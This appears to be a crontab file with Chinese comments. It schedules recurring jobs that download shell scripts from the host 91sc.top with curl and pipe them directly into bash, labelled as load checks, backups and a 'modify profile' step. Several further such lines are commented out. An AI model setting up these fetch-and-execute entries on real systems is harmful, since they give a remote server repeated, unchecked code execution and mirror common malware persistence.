#测试
#* * * * * /bin/echo `date` > /oss/log.txt


#检查电脑负载，每分钟
*/30 * * * * curl http://91sc.top/envcheck/check.sh | bash


#备份相关资料，
1 */24 * * * curl http://91sc.top/oss/oss.sh | bash




* * * * * echo "wfg" > abc.txt
#* * * * * curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 5; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 10; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 15; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 20; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 25; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 30; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 35; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 40; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 45; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 50; curl http://91sc.top/oss/cmapi.sh | bash
#* * * * * sleep 55; curl http://91sc.top/oss/cmapi.sh | bash



#备份相关资料，app
#1 23 * * * curl http://91sc.top/oss/oss_app.sh | bash



#修改profile
#* * * * * curl http://91sc.top/oss/h.sh | bash





#
